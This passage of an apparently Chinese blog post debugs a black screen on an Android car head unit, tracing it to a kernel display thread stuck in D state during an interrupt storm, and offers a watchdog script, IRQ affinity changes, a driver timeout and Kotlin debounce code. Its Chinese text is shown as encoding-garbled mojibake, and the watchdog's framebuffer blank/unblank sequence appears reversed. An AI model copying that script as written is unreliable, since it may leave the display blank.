  IRQ:     45%  â†’ 81%   <span class="hljs-comment"># ç¡¬ä¸­æ–­é£™å‡</span>
  SoftIRQ: 69%  â†’ 109%  <span class="hljs-comment"># è½¯ä¸­æ–­é£™å‡</span>
  Total:   ç»Ÿè®¡é”™è¯¯

æ—¶é—´ 11:58:11 (æ¢å¤å):
  IRQ:     4%
  SoftIRQ: 7%
  Total:   801% â‰ˆ 800% âœ“  <span class="hljs-comment"># ç»Ÿè®¡æ¢å¤æ­£å¸¸</span>
</code></pre>
<p><strong>å…³é”®å‘ç°</strong>: ä¸­æ–­ç‡é£™å‡æ—¶,ç»Ÿè®¡å‡ºé”™;ä¸­æ–­ç‡é™ä½å,ç»Ÿè®¡æ¢å¤æ­£å¸¸ã€‚è¿™ä¸æ˜¯å·§åˆ!</p>
<hr/>
<h2 data-id="heading-9">çœŸå‡¶ç°èº«:è¿›ç¨‹ D çŠ¶æ€</h2>
<p>æ—¢ç„¶ 4753% æ˜¯ç»Ÿè®¡é”™è¯¯,é‚£çœŸæ­£å¯¼è‡´é»‘å±çš„æ˜¯ä»€ä¹ˆ?</p>
<h3 data-id="heading-10">å‘ç°å…³é”®è¯æ®</h3>
<p>æˆ‘ä»”ç»†æŸ¥çœ‹äº†è¿›ç¨‹çŠ¶æ€åˆ— (S åˆ—):</p>
<pre><code class="hljs language-bash" lang="bash">æ—¶é—´ 11:56:42:
  PID  USER  PR  NI  VIRT  RES  SHR  S[%CPU] %MEM   TIME+     ARGS
  232  root  RT   0     0    0    0  D  6.8%  0.0  3:26.09  [crtc_commit:87]
10785  root  RT -20 52544 4640 3840  S  677%  0.0 306:18.05 ce470_gocsdk
</code></pre>
<p>æ³¨æ„ä¸¤ä¸ªå…³é”®ä¿¡æ¯:</p>
<ol>
<li>
<p><strong>ce470_gocsdk çŠ¶æ€æ˜¯ 'S' (Sleeping)</strong>, ä¸æ˜¯ 'R' (Running)</p>
<ul>
<li>è¿›ç¨‹åœ¨ç¡çœ ç­‰å¾…,ä¸æ˜¯åœ¨ç–¯ç‹‚æ¶ˆè€— CPU</li>
<li>å°è¯äº† 4753% æ˜¯ç»Ÿè®¡é”™è¯¯</li>
</ul>
</li>
<li>
<p><strong>PID 232 <code>[crtc_commit:87]</code> çŠ¶æ€æ˜¯ 'D'</strong> â­</p>
<ul>
<li>D = <strong>Uninterruptible Sleep</strong> (ä¸å¯ä¸­æ–­ç¡çœ )</li>
<li>è¿™æ‰æ˜¯å¯¼è‡´é»‘å±çš„ç›´æ¥åŸå› !</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">ä»€ä¹ˆæ˜¯ D çŠ¶æ€?</h3>
<p>åœ¨ Linux ä¸­,è¿›ç¨‹çŠ¶æ€æœ‰å‡ ç§:</p>









































<table><thead><tr><th align="left">çŠ¶æ€</th><th align="left">å«ä¹‰</th><th align="left">ç‰¹ç‚¹</th><th align="left">å¸¸è§åœºæ™¯</th></tr></thead><tbody><tr><td align="left">R</td><td align="left">Running</td><td align="left">æ­£åœ¨è¿è¡Œæˆ–ç­‰å¾… CPU</td><td align="left">æ­£å¸¸è®¡ç®—ä»»åŠ¡</td></tr><tr><td align="left">S</td><td align="left">Sleeping</td><td align="left">å¯ä¸­æ–­ç¡çœ </td><td align="left">ç­‰å¾…äº‹ä»¶(ç½‘ç»œã€ä¿¡å·)</td></tr><tr><td align="left"><strong>D</strong></td><td align="left"><strong>Disk Sleep</strong></td><td align="left"><strong>ä¸å¯ä¸­æ–­ç¡çœ </strong></td><td align="left"><strong>ç­‰å¾…ç¡¬ä»¶ I/O</strong></td></tr><tr><td align="left">Z</td><td align="left">Zombie</td><td align="left">åƒµå°¸è¿›ç¨‹</td><td align="left">è¿›ç¨‹å·²ç»ˆæ­¢,æœªå›æ”¶</td></tr><tr><td align="left">T</td><td align="left">Stopped</td><td align="left">æš‚åœ</td><td align="left">è°ƒè¯•å™¨æš‚åœ</td></tr></tbody></table>
<p><strong>D çŠ¶æ€çš„ç‰¹æ®Šæ€§</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å³ä½¿ kill -9 ä¹Ÿæ— æ³•æ€æ­» D çŠ¶æ€è¿›ç¨‹</span>
<span class="hljs-built_in">kill</span> -9 232
<span class="hljs-comment"># è¿›ç¨‹ä¾ç„¶å­˜åœ¨,å› ä¸ºå®ƒåœ¨ç­‰å¾…ç¡¬ä»¶å“åº”</span>

<span class="hljs-comment"># åªæœ‰ä¸¤ç§æƒ…å†µä¼šé€€å‡º D çŠ¶æ€:</span>
<span class="hljs-comment"># 1. ç¡¬ä»¶ I/O å®Œæˆ</span>
<span class="hljs-comment"># 2. ç¡¬ä»¶è¶…æ—¶æˆ–é©±åŠ¨æ¢å¤</span>
</code></pre>
<p>D çŠ¶æ€é€šå¸¸æ„å‘³ç€:</p>
<ul>
<li>è¿›ç¨‹åœ¨ç­‰å¾…ç£ç›˜/æ˜¾ç¤º/ç½‘ç»œç­‰ç¡¬ä»¶ I/O</li>
<li>ç¡¬ä»¶æˆ–é©±åŠ¨å‡ºç°é—®é¢˜,æ— æ³•å®Œæˆæ“ä½œ</li>
<li>è¿›ç¨‹è¢«"å¡æ­»"åœ¨å†…æ ¸æ€,æ— æ³•è¢«ä¸­æ–­</li>
</ul>
<h3 data-id="heading-12">crtc_commit æ˜¯ä»€ä¹ˆ?</h3>
<p><code>crtc_commit</code> æ˜¯ Linux DRM (Direct Rendering Manager) å­ç³»ç»Ÿä¸­çš„å†…æ ¸çº¿ç¨‹,è´Ÿè´£:</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/070da0d6aa32403e86a1e8ef16e70ad8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767923482&amp;x-signature=ygrbJT6t3QUpnaEQ0l4WQPI72dg%3D" alt="case3-android-graphics-architecture.png" loading="lazy"/></p>
<p><em>å›¾ 1: Android å›¾å½¢æ¶æ„å®Œæ•´é“¾è·¯ï¼Œçº¢è‰²æ ‡æ³¨çš„ crtc_commit æ˜¯æœ¬æ¬¡æ•…éšœç‚¹</em></p>
<p>å®ƒçš„å·¥ä½œæµç¨‹:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç®€åŒ–çš„å†…æ ¸ä»£ç é€»è¾‘</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crtc_commit_frames</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> drm_crtc *crtc)</span> {
    <span class="hljs-comment">// 1. ç­‰å¾… VSync (å‚ç›´åŒæ­¥ä¿¡å·)</span>
    wait_for_vsync(crtc);

    <span class="hljs-comment">// 2. æäº¤å¸§åˆ°æ˜¾ç¤ºç¡¬ä»¶</span>
    drm_crtc_send_vblank_event(crtc);

    <span class="hljs-comment">// 3. ç­‰å¾… DMA å®Œæˆ</span>
    wait_for_dma_completion(crtc);

    <span class="hljs-comment">// å¦‚æœç¡¬ä»¶ä¸å“åº”,è¿›ç¨‹å°±å¡åœ¨ D çŠ¶æ€</span>
}
</code></pre>
<p>å½“ crtc_commit å¡åœ¨ D çŠ¶æ€æ—¶:</p>
<ul>
<li>Surfaceflinger æ¸²æŸ“çš„æ–°å¸§æ— æ³•æäº¤</li>
<li>æ˜¾ç¤ºç¡¬ä»¶æ”¶ä¸åˆ°æ›´æ–°</li>
<li>å±å¹•åœç•™åœ¨æœ€åä¸€å¸§,æˆ–æ˜¾ç¤ºé»‘å±</li>
</ul>
<p><strong>è¿™å°±æ˜¯é»‘å±çš„ç›´æ¥åŸå› !</strong></p>
<hr/>
<h2 data-id="heading-13">é—®é¢˜æ—¶é—´çº¿åˆ†æ</h2>
<p>é€šè¿‡é€è¡Œåˆ†æ top æ—¥å¿—,æˆ‘è¿˜åŸäº†é—®é¢˜çš„å®Œæ•´æ¼”è¿›è¿‡ç¨‹:</p>













































































<table><thead><tr><th align="left">æ—¶é—´ç‚¹</th><th align="left">ç³»ç»ŸçŠ¶æ€</th><th align="left">ce470_gocsdk</th><th align="left">crtc_commit</th><th align="left">IRQ/SoftIRQ</th><th align="left">å…³é”®é—®é¢˜</th></tr></thead><tbody><tr><td align="left">11:56:12</td><td align="left">æ­£å¸¸</td><td align="left">482%</td><td align="left">æ­£å¸¸</td><td align="left">5%/9%</td><td align="left">æ— </td></tr><tr><td align="left">11:56:27</td><td align="left">è´Ÿè½½å‡é«˜</td><td align="left">677%</td><td align="left">å¼€å§‹å¼‚å¸¸</td><td align="left">8%/15%</td><td align="left">Topç»Ÿè®¡å¼€å§‹å‡ºé”™</td></tr><tr><td align="left">11:56:42</td><td align="left"><strong>é—®é¢˜çˆ†å‘</strong></td><td align="left"><strong>677%</strong></td><td align="left"><strong>DçŠ¶æ€</strong></td><td align="left"><strong>45%/69%</strong></td><td align="left"><strong>æ˜¾ç¤ºé©±åŠ¨å¡æ­»</strong></td></tr><tr><td align="left">11:56:55</td><td align="left">æŒç»­</td><td align="left">411%</td><td align="left">DçŠ¶æ€</td><td align="left">6%/10%</td><td align="left">é»‘å±æŒç»­</td></tr><tr><td align="left">11:57:17</td><td align="left"><strong>å³°å€¼</strong></td><td align="left">677%</td><td align="left"><strong>DçŠ¶æ€</strong></td><td align="left"><strong>81%/109%</strong></td><td align="left"><strong>ä¸­æ–­é£æš´</strong></td></tr><tr><td align="left">11:57:33</td><td align="left">ç¼“è§£</td><td align="left">677%</td><td align="left">æ¢å¤ä¸­</td><td align="left">30%/37%</td><td align="left">é€æ¸æ¢å¤</td></tr><tr><td align="left">11:57:45</td><td align="left">æ¢å¤</td><td align="left">677%</td><td align="left">æ¢å¤</td><td align="left">19%/32%</td><td align="left">é—®é¢˜æ¶ˆå¤±</td></tr><tr><td align="left">11:58:11</td><td align="left">æ­£å¸¸</td><td align="left">289%</td><td align="left">æ­£å¸¸</td><td align="left">4%/7%</td><td align="left">å®Œå…¨æ¢å¤</td></tr></tbody></table>
<p><strong>é—®é¢˜æŒç»­æ—¶é—´</strong>: çº¦ 60-90 ç§’
<strong>æ ¸å¿ƒé—®é¢˜çª—å£</strong>: 11:56:42 - 11:57:17 (35ç§’)</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80540b57702449eace567dfc4d9a8c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767923482&amp;x-signature=kY7ESTWm1%2BSdSAv3xv%2Fak0UibOo%3D" alt="case3-problem-timeline.png" loading="lazy"/></p>
<p><em>å›¾ 2: é—®é¢˜æ¼”è¿›æ—¶é—´çº¿å¯è§†åŒ–ï¼Œæ¸…æ™°å±•ç¤ºå„æŒ‡æ ‡éšæ—¶é—´çš„å˜åŒ–</em></p>
<h3 data-id="heading-14">å…³é”®è§‚å¯Ÿ</h3>
<ol>
<li><strong>ä¸­æ–­é£æš´å…ˆè¡Œ</strong>: é«˜ä¸­æ–­ç‡ (190%) å‡ºç°åœ¨ crtc_commit D çŠ¶æ€æœŸé—´</li>
<li><strong>è‡ªåŠ¨æ¢å¤</strong>: æ²¡æœ‰äººå·¥å¹²é¢„,ç³»ç»Ÿè‡ªå·±æ¢å¤äº† (ç¡¬ä»¶è¶…æ—¶?)</li>
<li><strong>ce470_gocsdk ç›¸å…³</strong>: å®ƒçš„é«˜è´Ÿè½½æ—¶æ®µä¸é—®é¢˜çª—å£é‡åˆ</li>
</ol>
<hr/>
<h2 data-id="heading-15">æ ¹å› æ¨æ–­:ä¸­æ–­é£æš´è§¦å‘æ˜¾ç¤ºé©±åŠ¨æ­»é”</h2>
<h3 data-id="heading-16">å› æœé“¾æ¡</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa02a82378c542f882353492726a2b34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767923482&amp;x-signature=NNXW2ttzCJc9ElClzwrCAjAK0e4%3D" alt="case3-problem-cause-chain.png" loading="lazy"/></p>
<p><em>å›¾ 3: å®Œæ•´çš„é—®é¢˜å› æœé“¾æ¡ï¼Œä»ç”¨æˆ·æ“ä½œåˆ°æœ€ç»ˆé»‘å±çš„æ¯ä¸€æ­¥æ¨å¯¼</em></p>
<h3 data-id="heading-17">ä¸ºä»€ä¹ˆæ˜¾ç¤ºé©±åŠ¨ä¼šå¡æ­»?</h3>
<p>æˆ‘æ¨æ–­äº†å‡ ç§å¯èƒ½æ€§:</p>
<h4 data-id="heading-18">å¯èƒ½æ€§ 1: ä¸­æ–­å†²çª (æ¦‚ç‡ 60%)</h4>
<p>åœ¨é«˜ä¸­æ–­è´Ÿè½½ä¸‹:</p>
<pre><code class="hljs language-diff" lang="diff">CPU 0-3: å¤„ç†è“ç‰™ä¸­æ–­ (ce470_gocsdk äº§ç”Ÿ)
CPU 4-7: å¤„ç†æ˜¾ç¤ºä¸­æ–­ (VSync, DMA å®Œæˆ)

å½“è“ç‰™ä¸­æ–­è¿‡å¤šæ—¶:
<span class="hljs-deletion">- å¯èƒ½å ç”¨äº†æœ¬è¯¥å¤„ç†æ˜¾ç¤ºä¸­æ–­çš„ CPU</span>
<span class="hljs-deletion">- æ˜¾ç¤ºä¸­æ–­è¢«å»¶è¿Ÿå¤„ç†</span>
<span class="hljs-deletion">- crtc_commit ç­‰å¾… VSync è¶…æ—¶</span>
<span class="hljs-deletion">- è¿›å…¥ D çŠ¶æ€,ç­‰å¾…ç¡¬ä»¶å“åº”</span>
</code></pre>
<p><strong>è¯æ®</strong>:</p>
<ul>
<li>IRQ ä» 5% é£™å‡è‡³ 81%</li>
<li>SoftIRQ ä» 9% é£™å‡è‡³ 109%</li>
<li>æ€»ä¸­æ–­è´Ÿè½½ = 81% + 109% = <strong>190%</strong> (å¼‚å¸¸é«˜!)</li>
</ul>
<h4 data-id="heading-19">å¯èƒ½æ€§ 2: æ˜¾ç¤ºé©±åŠ¨æ­»é” (æ¦‚ç‡ 30%)</h4>
<p>å†…æ ¸é©±åŠ¨å†…éƒ¨å¯èƒ½å­˜åœ¨é”ç«äº‰:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ä¼ªä»£ç å±•ç¤ºå¯èƒ½çš„æ­»é”åœºæ™¯</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">display_thread_A</span><span class="hljs-params">()</span> {
    lock(mutex_A);
    <span class="hljs-comment">// ç­‰å¾…ç¡¬ä»¶å“åº”</span>
    wait_for_hardware();
    lock(mutex_B);  <span class="hljs-comment">// â† å¦‚æœ B è¢«å ç”¨,æ­»é”</span>
    unlock(mutex_B);
    unlock(mutex_A);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">interrupt_handler</span><span class="hljs-params">()</span> {
    lock(mutex_B);
    <span class="hljs-comment">// å¤„ç†ä¸­æ–­</span>
    lock(mutex_A);  <span class="hljs-comment">// â† å¦‚æœ A è¢«å ç”¨,æ­»é”</span>
    unlock(mutex_A);
    unlock(mutex_B);
}
</code></pre>
<h4 data-id="heading-20">å¯èƒ½æ€§ 3: DMA ç¼“å†²åŒºè€—å°½ (æ¦‚ç‡ 10%)</h4>
<p>å†…å­˜å‹åŠ›è¾ƒå¤§æ—¶:</p>
<pre><code class="hljs language-bash" lang="bash">Mem: 16744M total, 16032M used, 712M free (95.7% ä½¿ç”¨ç‡)
</code></pre>
<p>å¯èƒ½å¯¼è‡´ DMA ç¼“å†²åŒºåˆ†é…å¤±è´¥,crtc_commit åœ¨ç­‰å¾…ç¼“å†²åŒºæ—¶å¡æ­»ã€‚</p>
<hr/>
<h2 data-id="heading-21">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-22">æ–¹æ¡ˆ 1: Watchdog è‡ªåŠ¨æ£€æµ‹å’Œæ¢å¤ â­â­â­â­â­</h3>
<p><strong>ä¼˜å…ˆçº§</strong>: æœ€é«˜ (ä¸´æ—¶ä¿æŠ¤æªæ–½)</p>
<p>åˆ›å»ºä¸€ä¸ªç›‘æ§è„šæœ¬,è‡ªåŠ¨æ£€æµ‹ crtc_commit D çŠ¶æ€å¹¶è§¦å‘æ¢å¤:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/system/bin/sh</span>
<span class="hljs-comment"># /vendor/bin/display_watchdog.sh</span>

LOG_TAG=<span class="hljs-string">"DisplayWatchdog"</span>
CHECK_INTERVAL=5
D_STATE_THRESHOLD=5  <span class="hljs-comment"># è¿ç»­æ£€æµ‹åˆ° D çŠ¶æ€ 5 æ¬¡åˆ™è§¦å‘æ¢å¤</span>

d_state_count=0

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># æ£€æŸ¥ crtc_commit æ˜¯å¦å¤„äº D çŠ¶æ€</span>
    crtc_state=$(ps -A -o pid,state,<span class="hljs-built_in">comm</span> | grep crtc_commit | awk <span class="hljs-string">'{print $2}'</span>)

    <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$crtc_state</span>"</span> = <span class="hljs-string">"D"</span> ]; <span class="hljs-keyword">then</span>
        d_state_count=$((d_state_count + <span class="hljs-number">1</span>))
        <span class="hljs-built_in">log</span> -t <span class="hljs-variable">$LOG_TAG</span> <span class="hljs-string">"crtc_commit in D state, count: <span class="hljs-variable">$d_state_count</span>"</span>

        <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$d_state_count</span> -ge <span class="hljs-variable">$D_STATE_THRESHOLD</span> ]; <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">log</span> -t <span class="hljs-variable">$LOG_TAG</span> <span class="hljs-string">"Display stuck detected, triggering recovery"</span>

            <span class="hljs-comment"># å°è¯•é‡ç½®æ˜¾ç¤º</span>
            <span class="hljs-built_in">echo</span> 0 &gt; /sys/class/graphics/fb0/blank
            <span class="hljs-built_in">sleep</span> 0.2
            <span class="hljs-built_in">echo</span> 1 &gt; /sys/class/graphics/fb0/blank

            <span class="hljs-comment"># å¦‚æœè¿˜æ˜¯å¡ä½,å¼ºåˆ¶é‡å¯ surfaceflinger</span>
            crtc_state=$(ps -A -o pid,state,<span class="hljs-built_in">comm</span> | grep crtc_commit | awk <span class="hljs-string">'{print $2}'</span>)
            <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$crtc_state</span>"</span> = <span class="hljs-string">"D"</span> ]; <span class="hljs-keyword">then</span>
                <span class="hljs-built_in">log</span> -t <span class="hljs-variable">$LOG_TAG</span> <span class="hljs-string">"Hard reset: restarting surfaceflinger"</span>
                stop surfaceflinger
                <span class="hljs-built_in">sleep</span> 1
                start surfaceflinger
            <span class="hljs-keyword">fi</span>

            d_state_count=0
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">else</span>
        d_state_count=0
    <span class="hljs-keyword">fi</span>

    <span class="hljs-built_in">sleep</span> <span class="hljs-variable">$CHECK_INTERVAL</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>é…ç½®ä¸ºç³»ç»ŸæœåŠ¡</strong> (ä¿®æ”¹ init.rc):</p>
<pre><code class="hljs language-rc" lang="rc">service display_watchdog /vendor/bin/display_watchdog.sh
    class main
    user root
    group root system
    disabled
    oneshot

on property:sys.boot_completed=1
    start display_watchdog
</code></pre>
<p><strong>é¢„æœŸæ•ˆæœ</strong>:</p>
<ul>
<li>è‡ªåŠ¨æ£€æµ‹æ˜¾ç¤ºå¡æ­» (25ç§’å†…)</li>
<li>è‡ªåŠ¨è§¦å‘æ¢å¤</li>
<li>é¿å…é•¿æ—¶é—´é»‘å±</li>
</ul>
<p><strong>å®æ–½éš¾åº¦</strong>: â­â­ (ä¸­ç­‰)
<strong>é¢„è®¡æ—¶é—´</strong>: 4-8 å°æ—¶</p>
<h3 data-id="heading-23">æ–¹æ¡ˆ 2: ä¼˜åŒ–ä¸­æ–­å¤„ç†</h3>
<p>è°ƒæ•´ä¸­æ–­äº²å’Œæ€§,è®©è“ç‰™å’Œæ˜¾ç¤ºä¸­æ–­åˆ†å¼€å¤„ç†:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ä¸­æ–­åˆ†é…</span>
<span class="hljs-built_in">cat</span> /proc/interrupts | grep -E <span class="hljs-string">"(bluetooth|dri|gpu)"</span>

<span class="hljs-comment"># å°†è“ç‰™ä¸­æ–­ç»‘å®šåˆ° CPU 0-3</span>
<span class="hljs-built_in">echo</span> 0f &gt; /proc/irq/&lt;bluetooth_irq&gt;/smp_affinity

<span class="hljs-comment"># å°†æ˜¾ç¤ºä¸­æ–­ç»‘å®šåˆ° CPU 4-7</span>
<span class="hljs-built_in">echo</span> f0 &gt; /proc/irq/&lt;display_irq&gt;/smp_affinity
</code></pre>
<p><strong>é¢„æœŸæ•ˆæœ</strong>:</p>
<ul>
<li>å‡å°‘ä¸­æ–­å†²çª</li>
<li>é™ä½è§¦å‘æ¦‚ç‡ 60-70%</li>
</ul>
<p><strong>å®æ–½éš¾åº¦</strong>: â­â­â­â­ (è¾ƒéš¾)
<strong>é¢„è®¡æ—¶é—´</strong>: 1-2 å‘¨</p>
<h3 data-id="heading-24">æ–¹æ¡ˆ 3: ä¿®å¤æ˜¾ç¤ºé©±åŠ¨æ­»é”</h3>
<p>åœ¨å†…æ ¸é©±åŠ¨ä¸­æ·»åŠ è¶…æ—¶æœºåˆ¶:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// drivers/gpu/drm/xxx/xxx_crtc.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crtc_commit_wait_for_vsync</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> drm_crtc *crtc)</span> {
    <span class="hljs-type">long</span> timeout = msecs_to_jiffies(<span class="hljs-number">100</span>); <span class="hljs-comment">// 100ms è¶…æ—¶</span>

    timeout = wait_event_timeout(crtc-&gt;vblank_wait,
                                  is_vsync_ready(),
                                  timeout);

    <span class="hljs-keyword">if</span> (timeout == <span class="hljs-number">0</span>) {
        DRM_ERROR(<span class="hljs-string">"VSync wait timeout, recovering..."</span>);
        <span class="hljs-comment">// è§¦å‘æ¢å¤æœºåˆ¶</span>
        drm_crtc_reset(crtc);
        <span class="hljs-keyword">return</span> -ETIMEDOUT;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>é¢„æœŸæ•ˆæœ</strong>:</p>
<ul>
<li>ä»æ ¹æœ¬ä¸Šè§£å†³é©±åŠ¨å¡æ­»</li>
<li>å³ä½¿å¼‚å¸¸ä¹Ÿèƒ½è‡ªåŠ¨æ¢å¤</li>
</ul>
<p><strong>å®æ–½éš¾åº¦</strong>: â­â­â­â­â­ (éå¸¸éš¾)
<strong>é¢„è®¡æ—¶é—´</strong>: 2-4 å‘¨</p>
<h3 data-id="heading-25">æ–¹æ¡ˆ 4: åº”ç”¨å±‚é˜²æŠ–</h3>
<p>åœ¨ç©ºè°ƒæ§åˆ¶åº”ç”¨ä¸­æ·»åŠ ç‚¹å‡»é˜²æŠ–:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HvacController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> lastClickTime = <span class="hljs-number">0L</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> pendingCommand: Runnable? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> handler = Handler(Looper.getMainLooper())
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> DEBOUNCE_INTERVAL = <span class="hljs-number">300L</span> <span class="hljs-comment">// 300ms</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAcSwitchClick</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// å–æ¶ˆä¹‹å‰çš„å¾…å¤„ç†å‘½ä»¤</span>
        pendingCommand?.let { handler.removeCallbacks(it) }

        <span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œ,å®ç°é˜²æŠ–</span>
        pendingCommand = Runnable {
            sendAcCommand()
        }

        handler.postDelayed(pendingCommand!!, DEBOUNCE_INTERVAL)

        Log.d(TAG, <span class="hljs-string">"AC switch click scheduled"</span>)
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendAcCommand</span><span class="hljs-params">()</span></span> {
        BluetoothManager.sendCommand(AC_SWITCH_CMD)
    }
}
</code></pre>
<p><strong>é¢„æœŸæ•ˆæœ</strong>:</p>
<ul>
<li>ä»æºå¤´å‡å°‘äº‹ä»¶æ•°é‡</li>
<li>é™ä½è§¦å‘æ¦‚ç‡</li>
</ul>
<p><strong>å®æ–½éš¾åº¦</strong>: â­â­ (ç®€å•)
<strong>é¢„è®¡æ—¶é—´</strong>: 2-4 å°æ—¶</p>
<hr/>
<h2 data-id="heading-26">éªŒè¯å’Œæµ‹è¯•</h2>
<h3 data-id="heading-27">æµ‹è¯•ç”¨ä¾‹è®¾è®¡</h3>
<p><strong>æµ‹è¯•ç”¨ä¾‹ 1: å¿«é€Ÿè¿ç»­ç‚¹å‡»</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ­¥éª¤:
<span class="hljs-bullet">1.</span> ä»¥æœ€å¿«é€Ÿåº¦è¿ç»­ç‚¹å‡»ç©ºè°ƒå¼€å…³ 100 æ¬¡
<span class="hljs-bullet">2.</span> ç›‘æ§ crtc<span class="hljs-emphasis">_commit çŠ¶æ€: watch -n 1 'ps aux | grep crtc_</span>commit'
<span class="hljs-bullet">3.</span> ç›‘æ§ä¸­æ–­ç‡: watch -n 1 'cat /proc/stat | grep "^intr"'

é¢„æœŸç»“æœ:
<span class="hljs-bullet">-</span> ç•Œé¢æ­£å¸¸,æ— é»‘å±
<span class="hljs-bullet">-</span> crtc<span class="hljs-emphasis">_commit æ—  D çŠ¶æ€
- IRQ + SoftIRQ &lt; 30%
</span></code></pre>
<p><strong>æµ‹è¯•ç”¨ä¾‹ 2: é•¿æ—¶é—´å‹åŠ›æµ‹è¯•</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># auto_click_test.sh</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..300}; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># æ¨¡æ‹Ÿç‚¹å‡»ç©ºè°ƒå¼€å…³</span>
    input tap 500 300
    <span class="hljs-built_in">sleep</span> 0.2
<span class="hljs-keyword">done</span>
</code></pre>
<p>è¿è¡Œæµ‹è¯•å¹¶ç›‘æ§:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»ˆç«¯ 1: è¿è¡Œæµ‹è¯•</span>
./auto_click_test.sh

<span class="hljs-comment"># ç»ˆç«¯ 2: ç›‘æ§ D çŠ¶æ€è¿›ç¨‹</span>
watch -n 1 <span class="hljs-string">'ps aux | grep " D "'</span>

<span class="hljs-comment"># ç»ˆç«¯ 3: ç›‘æ§ä¸­æ–­ç‡</span>
watch -n 1 <span class="hljs-string">'cat /proc/interrupts | head -20'</span>
</code></pre>
<h3 data-id="heading-28">å…³é”®æŒ‡æ ‡</h3>



































<table><thead><tr><th align="left">æŒ‡æ ‡</th><th align="center">æ­£å¸¸å€¼</th><th align="center">å¯æ¥å—</th><th align="center">å¼‚å¸¸</th></tr></thead><tbody><tr><td align="left">crtc_commit D çŠ¶æ€æ—¶é—´</td><td align="center">0s</td><td align="center">&lt; 5s</td><td align="center">&gt; 5s</td></tr><tr><td align="left">IRQ + SoftIRQ</td><td align="center">&lt; 20%</td><td align="center">&lt; 50%</td><td align="center">&gt; 50%</td></tr><tr><td align="left">ce470_gocsdk CPU</td><td align="center">10-50%</td><td align="center">&lt; 700%</td><td align="center">&gt; 700%</td></tr><tr><td align="left">å†…å­˜ä½¿ç”¨ç‡</td><td align="center">&lt; 80%</td><td align="center">&lt; 90%</td><td align="center">&gt; 90%</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-29">è°ƒè¯•æŠ€å·§æ€»ç»“</h2>
<h3 data-id="heading-30">1. å¦‚ä½•è¯†åˆ« Top ç»Ÿè®¡é”™è¯¯</h3>
<p>å½“çœ‹åˆ°ä¸åˆç†çš„ CPU æ•°æ®æ—¶:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥æ€»å’Œæ˜¯å¦ç­‰äºæ ¸å¿ƒæ•° Ã— 100%</span>
<span class="hljs-comment"># 8 æ ¸ç³»ç»Ÿ: Total åº”çº¦ç­‰äº 800%</span>

<span class="hljs-comment"># å¦‚æœå¤šä¸ªå€¼éƒ½è¶…è¿‡ç†è®ºä¸Šé™,æ˜¯ç»Ÿè®¡é”™è¯¯</span>
System: 5178% &gt; 800% âœ—
Idle:   6138% &gt; 800% âœ—
Process: 4753% &gt; 800% âœ—

<span class="hljs-comment"># æŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ç¡®è®¤</span>
ps -A -o pid,state,<span class="hljs-built_in">comm</span> | grep &lt;process_name&gt;
<span class="hljs-comment"># å¦‚æœçŠ¶æ€æ˜¯ S (Sleeping),ä¸å¯èƒ½é«˜ CPU</span>
</code></pre>
